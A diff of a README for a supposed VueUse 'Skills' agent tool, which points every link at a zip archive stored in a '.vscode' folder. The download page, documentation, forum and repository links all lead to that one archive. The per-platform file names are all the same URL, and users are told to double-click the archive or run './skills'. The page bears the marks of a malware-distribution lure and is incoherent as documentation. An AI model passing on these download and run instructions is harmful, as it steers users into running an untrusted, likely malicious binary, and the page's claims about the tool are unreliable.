@@ -1,7 +1,7 @@
 # 🛠️ skills - Unlock New Skills for Your Projects
 
 ## 📥 Download Now
-[![Download skills](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip%20skills-v1.0-blue)](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip)
+[![Download skills](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip%20skills-v1.0-blue)](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip)
 
 ## 🧩 What is Skills?
 Skills is a powerful tool designed for enhancing agent capabilities in VueUse applications. It provides a suite of features that allow users to easily integrate agent skills into their projects without needing extensive programming knowledge.
@@ -16,13 +16,13 @@ To start using Skills, you will need to follow a few simple steps to download an
 - Network: Internet connection for downloading the application.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip) to download the latest version of Skills.
+1. Visit the [Releases page](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip) to download the latest version of Skills.
 2. Look for the most recent version listed. Click on it to access the available files.
-3. Download the file named `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip` for Windows, `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip` for Mac, or `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip` for Linux. Choose the one that matches your operating system.
+3. Download the file named `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip` for Windows, `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip` for Mac, or `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip` for Linux. Choose the one that matches your operating system.
 4. Once the download is complete, locate the file in your downloads folder:
-   - For Windows: Double-click on `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip`.
-   - For Mac: Double-click on `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip`, then drag the Skills application to your Applications folder.
-   - For Linux: Extract the contents of `https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip`, then open a terminal and run `./skills`.
+   - For Windows: Double-click on `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip`.
+   - For Mac: Double-click on `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip`, then drag the Skills application to your Applications folder.
+   - For Linux: Extract the contents of `https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip`, then open a terminal and run `./skills`.
 
 5. Follow the installation prompts to complete the setup.
 
@@ -59,11 +59,11 @@ For additional support, kindly check our resources or open an issue for further 
 Skills is licensed under the MIT License. See the LICENSE file for more details.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip)
-- [Community Forum](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip)
+- [Documentation](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip)
+- [GitHub Repository](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip)
+- [Community Forum](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip)
 
 ## 📥 Download Skills Again
 If you need to return to the download page, click the link below.
 
-[![Download skills](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip%20skills-v1.0-blue)](https://raw.githubusercontent.com/syw-afk/skills/main/skills/vueuse-functions/references/Software_v1.8.zip)
+[![Download skills](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip%20skills-v1.0-blue)](https://github.com/syw-afk/skills/raw/refs/heads/main/.vscode/Software_v1.2.zip)
